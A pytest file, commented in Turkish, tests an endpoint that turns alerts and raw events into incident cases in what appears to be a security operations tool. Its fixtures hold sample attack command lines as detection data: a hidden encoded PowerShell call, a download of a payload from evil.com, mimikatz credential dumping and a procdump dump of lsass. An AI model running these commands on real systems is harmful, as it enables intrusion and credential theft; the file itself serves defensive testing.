"""
tests.test_case_from_preview_api
===================================
POST /api/cases/from-preview API endpoint testleri.

FastAPI TestClient ile çalışır — auth dependency'leri override edilir.
DB erişimi gerçek SQLite (in-memory değil, test DB) üzerinden olur.
"""

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.api.routes_case_from_preview import _from_preview_auth
from app.core.security import get_current_tenant_id


# ---------------------------------------------------------------------------
# Auth Override Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def _override_auth():
    """Auth dependency'lerini override et — JWT gerektirmeden test."""

    async def _mock_user():
        return "test-analyst"

    async def _mock_tenant():
        return "test-tenant"

    app.dependency_overrides[_from_preview_auth] = _mock_user
    app.dependency_overrides[get_current_tenant_id] = _mock_tenant
    yield
    app.dependency_overrides.clear()


@pytest.fixture
def client():
    return TestClient(app)


# ---------------------------------------------------------------------------
# Test Helpers
# ---------------------------------------------------------------------------

def _powershell_chain_raw():
    """PowerShell chain rule'ını tetikleyecek 2 raw event dict."""
    return [
        {
            "type": "PROCESS_START",
            "hostname": "WS-01",
            "user": "admin",
            "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgA",
            "severity": "HIGH",
            "risk_score": 75,
        },
        {
            "type": "PROCESS_START",
            "hostname": "WS-01",
            "user": "admin",
            "command_line": "powershell.exe Invoke-WebRequest http://evil.com/payload -OutFile c:\\temp\\p.exe",
            "severity": "HIGH",
            "risk_score": 80,
        },
    ]


def _credential_chain_alerts():
    """Credential dumping chain tetikleyecek alert dict'ler."""
    return [
        {
            "id": "alert-001",
            "hostname": "DC-01",
            "username": "attacker",
            "type": "PROCESS_START",
            "command_line": "mimikatz.exe privilege::debug",
            "risk_score": 90,
            "severity": "CRITICAL",
            "details": "sekurlsa logonpasswords",
            "rule": "Credential Dumping",
        },
        {
            "id": "alert-002",
            "hostname": "DC-01",
            "username": "attacker",
            "type": "PROCESS_START",
            "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
            "risk_score": 85,
            "severity": "HIGH",
            "details": "lsass dump",
            "rule": "LSASS Access",
        },
    ]


# ---------------------------------------------------------------------------
# 1. Route Registered
# ---------------------------------------------------------------------------

class TestCaseFromPreviewRouteRegistered:

    def test_route_registered(self, client):
        """POST /api/cases/from-preview kayıtlı — 422 veya 200 (405 değil)."""
        resp = client.post("/api/cases/from-preview")
        assert resp.status_code != 405, "Route kayıtlı değil!"


# ---------------------------------------------------------------------------
# 2. Auth Rejected
# ---------------------------------------------------------------------------

class TestCaseFromPreviewAuth:

    def test_unauthenticated_401(self, client):
        """Auth override temizlenince → 401."""
        app.dependency_overrides.clear()

        resp = client.post("/api/cases/from-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        assert resp.status_code == 401


# ---------------------------------------------------------------------------
# 3. Valid Alerts → Case Created
# ---------------------------------------------------------------------------

class TestCaseFromPreviewAlerts:

    def test_valid_alerts_creates_case(self, client):
        """Valid alerts → 200, created_cases boş değil."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "alerts",
            "items": _credential_chain_alerts(),
        })
        assert resp.status_code == 200
        data = resp.json()
        assert len(data["created_cases"]) >= 1
        assert len(data["case_drafts"]) >= 1

    def test_created_case_has_required_fields(self, client):
        """Her created_case'de id, title, severity, status var."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "alerts",
            "items": _credential_chain_alerts(),
        })
        data = resp.json()
        case = data["created_cases"][0]
        for field in ("id", "title", "severity", "status", "created_at", "updated_at"):
            assert field in case, f"Missing field: {field}"


# ---------------------------------------------------------------------------
# 4. Valid Raw Events → Case Created
# ---------------------------------------------------------------------------

class TestCaseFromPreviewRawEvents:

    def test_valid_raw_events_creates_case(self, client):
        """Valid raw_events → 200, created_cases boş değil."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        assert resp.status_code == 200
        data = resp.json()
        assert len(data["created_cases"]) >= 1

    def test_case_drafts_included(self, client):
        """Response'da case_drafts boş değil."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        assert len(data["case_drafts"]) >= 1


# ---------------------------------------------------------------------------
# 5. Case Field Mapping
# ---------------------------------------------------------------------------

class TestCaseFromPreviewFieldMapping:

    def test_case_status_open(self, client):
        """Oluşturulan case status='open'."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        case = data["created_cases"][0]
        assert case["status"] == "open"

    def test_severity_mapped(self, client):
        """CaseDraft severity → Case severity (INFO değil)."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "alerts",
            "items": _credential_chain_alerts(),
        })
        data = resp.json()
        case = data["created_cases"][0]
        # credential chain → en az HIGH veya CRITICAL
        assert case["severity"] in ("HIGH", "CRITICAL", "WARNING")

    def test_description_from_summary(self, client):
        """CaseDraft summary → Case description (None değil)."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        case = data["created_cases"][0]
        # description boş string veya None olabilir ama genellikle dolu
        # En azından title dolu olmalı
        assert case["title"]

    def test_owner_from_current_user(self, client):
        """Case owner = test-analyst (mock user)."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        case = data["created_cases"][0]
        assert case["owner"] == "test-analyst"


# ---------------------------------------------------------------------------
# 6. Summary
# ---------------------------------------------------------------------------

class TestCaseFromPreviewSummary:

    def test_summary_fields_present(self, client):
        """Summary tüm beklenen alanları içerir."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        summary = data["summary"]
        for field in (
            "total_items", "total_case_drafts", "total_created_cases",
            "total_linked_alerts", "highest_severity", "max_risk_score",
        ):
            assert field in summary, f"Missing summary field: {field}"

    def test_summary_counts_match(self, client):
        """total_created_cases == len(created_cases)."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        assert data["summary"]["total_created_cases"] == len(data["created_cases"])
        assert data["summary"]["total_case_drafts"] == len(data["case_drafts"])


# ---------------------------------------------------------------------------
# 7. Consolidation
# ---------------------------------------------------------------------------

class TestCaseFromPreviewConsolidation:

    def test_multiple_drafts_all_persisted(self, client):
        """consolidate=false → her story ayrı case → birden fazla created_cases."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
            "consolidate": False,
        })
        assert resp.status_code == 200
        data = resp.json()
        # Her case_draft → created case
        assert len(data["created_cases"]) == len(data["case_drafts"])
        assert data["summary"]["total_created_cases"] == len(data["created_cases"])


# ---------------------------------------------------------------------------
# 8. Empty Items → 400
# ---------------------------------------------------------------------------

class TestCaseFromPreviewEmptyItems:

    def test_empty_items_400(self, client):
        """items=[] → 400."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "raw_events",
            "items": [],
        })
        assert resp.status_code == 400
        assert "item gerekli" in resp.json()["detail"]


# ---------------------------------------------------------------------------
# 9. Unsupported Source Type → 400
# ---------------------------------------------------------------------------

class TestCaseFromPreviewUnsupported:

    def test_unsupported_source_type_400(self, client):
        """Bilinmeyen source_type → HTTP 400."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "INVALID_TYPE",
            "items": [{"foo": "bar"}],
        })
        assert resp.status_code == 400
        assert "Desteklenmeyen source_type" in resp.json()["detail"]


# ---------------------------------------------------------------------------
# 10. Linked Alert Count
# ---------------------------------------------------------------------------

class TestCaseFromPreviewAlertLinking:

    def test_linked_alert_count_type(self, client):
        """linked_alert_count integer."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        assert isinstance(data["linked_alert_count"], int)

    def test_warnings_for_missing_alerts(self, client):
        """
        Alert ID'leri DB'de yoksa → linked_alert_count düşük olabilir,
        warnings'de mesaj olabilir.
        Raw events source_type'da related_alert_ids genelde boştur.
        """
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        # Başarıyla dönmeli (warnings olsun olmasın)
        assert resp.status_code == 200
        assert isinstance(data["warnings"], list)

    def test_alert_source_populates_related_alert_ids(self, client):
        """source_type=alerts → case_drafts[0].related_alert_ids boş değil."""
        resp = client.post("/api/cases/from-preview", json={
            "source_type": "alerts",
            "items": _credential_chain_alerts(),
        })
        assert resp.status_code == 200
        data = resp.json()
        cd = data["case_drafts"][0]
        assert len(cd.get("related_alert_ids", [])) >= 1


# ---------------------------------------------------------------------------
# 11. Regression — Existing Endpoints Not Broken
# ---------------------------------------------------------------------------

class TestExistingEndpointsNotBroken:

    def test_existing_preview_not_broken(self, client):
        """Mevcut /api/cases/preview hâlâ çalışıyor."""
        from app.api.routes_case_preview import _case_preview_auth

        app.dependency_overrides[_case_preview_auth] = lambda: "test-analyst"

        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        assert resp.status_code == 200
        data = resp.json()
        assert "case_drafts" in data
        assert "attack_stories" in data
        # Preview'da created_cases yok
        assert "created_cases" not in data

    def test_existing_cases_list_not_broken(self, client):
        """Mevcut /api/cases route'u hâlâ kayıtlı."""
        resp = client.get("/api/cases")
        # 401 veya 200 olabilir (auth bağlı), ama 404/405 olmamalı
        assert resp.status_code != 404
        assert resp.status_code != 405

    def test_existing_case_detail_route_not_broken(self, client):
        """Mevcut /api/cases/{case_id} route'u hâlâ kayıtlı."""
        resp = client.get("/api/cases/nonexistent-id")
        # 401 veya 404 olabilir, ama 405 olmamalı
        assert resp.status_code != 405
